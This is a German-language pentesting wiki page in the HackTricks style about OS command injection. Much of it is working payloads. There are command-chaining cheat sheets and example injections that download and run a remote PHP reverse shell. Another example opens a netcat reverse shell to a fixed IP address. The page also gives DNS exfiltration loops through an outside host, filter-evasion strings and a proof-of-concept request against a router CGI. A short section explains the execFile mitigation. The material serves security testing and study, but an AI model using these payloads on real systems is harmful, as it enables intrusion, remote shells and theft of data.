# Command Injection

{{#include ../banners/hacktricks-training.md}}

## Was ist command Injection?

Eine **command injection** ermöglicht einem Angreifer die Ausführung willkürlicher Betriebssystembefehle auf dem Server, der eine Anwendung hostet. Infolgedessen können die Anwendung und alle ihre Daten vollständig kompromittiert werden. Die Ausführung dieser Befehle erlaubt dem Angreifer typischerweise, unautorisierten Zugriff auf die Umgebung der Anwendung und das zugrunde liegende System zu erlangen oder Kontrolle darüber zu übernehmen.

### Kontext

Abhängig davon, **wo Ihre Eingabe injiziert wird**, müssen Sie möglicherweise **den zitierten Kontext beenden** (mit `"` oder `'`) bevor die Befehle.

## Command Injection/Execution
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
### **Beschränkungen** Bypasses

Wenn du versuchst, **arbitrary commands inside a linux machine** auszuführen, solltest du dir diese **Bypasses** ansehen:


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **Beispiele**
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```
### Parameter

Hier sind die Top 25 Parameter, die für code injection und ähnliche RCE-Schwachstellen anfällig sein könnten (von [link](https://twitter.com/trbughunters/status/1283133356922884096)):
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
### Time based data exfiltration

Datenextraktion: char by char
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
### DNS based data exfiltration

Basierend auf dem Tool von `https://github.com/HoLyVieR/dnsbin`, das auch auf dnsbin.zhack.ca gehostet ist.
```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```
Online-Tools zur Überprüfung von DNS-basierter data exfiltration:

- dnsbin.zhack.ca
- pingb.in

### Umgehung von Filtern

#### Windows
```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```
#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` vs `execFile`

Beim Audit von JavaScript/TypeScript-Backends stößt man häufig auf die Node.js `child_process` API.
```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
/* … */
});
```
`exec()` startet eine **shell** (`/bin/sh -c`), daher kann jedes Zeichen, das für die shell eine besondere Bedeutung hat (back-ticks, `;`, `&&`, `|`, `$()`, …), zu **command injection** führen, wenn Benutzereingaben in den String konkateniert werden.

**Gegenmaßnahme:** verwende `execFile()` (oder `spawn()` ohne die `shell`-Option) und übergebe **jedes Argument als separates Array-Element**, sodass keine shell beteiligt ist:
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
'--id_user', id_user,
'--payload', JSON.stringify(payload)
]);
```
Real-world case: *Synology Photos* ≤ 1.7.0-0794 war über ein unauthentifiziertes WebSocket-Ereignis angreifbar, das vom Angreifer kontrollierte Daten in `id_user` platzierte, die später in einem `exec()`-Aufruf eingebettet wurden und RCE ermöglichten (Pwn2Own Ireland 2024).

### Argument-/Option-Injektion durch führenden Bindestrich (argv, keine Shell-Metazeichen)

Nicht alle Injektionen benötigen Shell-Metazeichen. Wenn die Anwendung unvertrauenswürdige Strings als Argumente an ein Systemutility übergibt (selbst mit `execve`/`execFile` und ohne Shell), werden viele Programme trotzdem jedes Argument, das mit `-` oder `--` beginnt, als Option interpretieren. Dadurch kann ein Angreifer Modi umschalten, Ausgabewege ändern oder gefährliches Verhalten auslösen, ohne jemals in eine Shell einzubrechen.

Typische Orte, an denen das vorkommt:

- Eingebettete Web-UIs/CGI-Handler, die Befehle wie `ping <user>`, `tcpdump -i <iface> -w <file>`, `curl <url>`, usw. zusammensetzen.
- Zentrale CGI-Router (z. B. `/cgi-bin/<something>.cgi` mit einem Selektor-Parameter wie `topicurl=<handler>`), bei denen mehrere Handler denselben schwachen Validator wiederverwenden.

Was zu versuchen:

- Werte angeben, die mit `-`/`--` beginnen, damit das nachgelagerte Tool sie als Flags interpretiert.
- Flags missbrauchen, die das Verhalten ändern oder Dateien schreiben, zum Beispiel:
- `ping`: `-f`/`-c 100000`, um das Gerät zu belasten (DoS)
- `curl`: `-o /tmp/x`, um beliebige Pfade zu schreiben, `-K <url>`, um eine vom Angreifer kontrollierte Konfiguration zu laden
- `tcpdump`: `-G 1 -W 1 -z /path/script.sh`, um in unsicheren Wrappern eine Ausführung nach Rotation zu erreichen
- Wenn das Programm `--` (Ende-der-Optionen) unterstützt, versuchen Sie, naive Mitigations zu umgehen, die `--` an die falsche Stelle voranstellen.

Generische PoC-Muster gegen zentrale CGI-Dispatcher:
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Flip options in a downstream tool via argv injection
topicurl=<handler>&param=-n

# Unauthenticated RCE when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;
```
## Brute-Force-Erkennungsliste


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}

## Referenzen

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Extraction of Synology encrypted archives – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [PHP proc_open manual](https://www.php.net/manual/en/function.proc-open.php)
- [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)

{{#include ../banners/hacktricks-training.md}}
